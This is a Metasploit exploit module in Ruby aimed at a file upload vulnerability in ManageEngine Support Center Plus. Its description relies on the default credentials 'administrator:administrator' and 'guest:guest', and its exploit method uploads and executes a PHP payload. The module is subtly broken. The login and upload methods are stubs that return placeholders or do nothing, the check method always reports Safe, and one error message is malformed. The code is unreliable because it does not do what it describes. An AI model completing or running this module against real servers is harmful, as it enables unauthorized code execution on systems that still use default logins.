##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::PhpEXE

	def initialize(info={})
		super(update_info(info,
			'Name'           => "ManageEngine Support Center Plus File Upload Vulnerability",
			'Description'    => %q{
					This module exploits a file upload vulnerability found in ManageEngine Support
				Center Plus.  It is possible to bypass the file extension verification check, and
				then upload an arbitrary file on to the service.  A valid login is required in oder
				to exploit the upload feature, however, there are default credentials that can be
				abused.  For example, the default installer comes with 'administrator:administrator'
				for administrative access; or 'guest:guest' for guest access.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'xistence',  # Original
					'sinn3r'     # Metasploit
				],
			'References'     =>
				[
					['OSVDB', '86598'],
					['EDB', '22040']
				],
			'Platform'       => ['linux', 'win'],
			'Targets'        =>
				[
					[ 'Winodws', { 'Arch' => ARCH_X86, 'Platform' => 'win' }  ],
					[ 'Linux'  , { 'Arch' => ARCH_X86, 'Platform' => 'linux'} ]
				],
			'Privileged'     => false,
			'DisclosureDate' => "Oct 17 2012"
		))

		register_options(
			[
				OptString.new('TARGETURI', [true, 'The base directory to the application', '/']),
				OptString.new('USERNAME',  [true, 'The username to login with', 'administrator']),
				OptString.new('PASSWORD',  [true, 'The password to login with', 'administrator'])
			], self.class)
	end

	def base
		base = target_uri.path
		base << '/' if base[-1,1] != '/'
		return base
	end

	def peer
		"#{rhost}:#{rport}"
	end

	def check
		Exploit::CheckCode::Safe
	end

	def login(user, pass)
		return 'cookie', 'session_id'
	end

	def upload_exec(cookie, sid, fname, p)
	end

	def exploit
		#
		# Login in order to obtain the cookie and session ID
		#
		user = datastore['USERNAME']
		pass = datastore['PASSWORD']

		cookie, sid = login(user, pass)
		if cookie.empty? or sid.empty?
			print_error("Unable to login with #{}")
			return
		end

		#
		# Upload our payload and execute it
		#
		php_fname = "#{Rex::Text.rand_text_alpha(5)}.php"
		p         = get_write_exec_payload(:unlink_self=>true)
		upload_exec(cookie, sid, php_fname, p)

		handler
	end
end
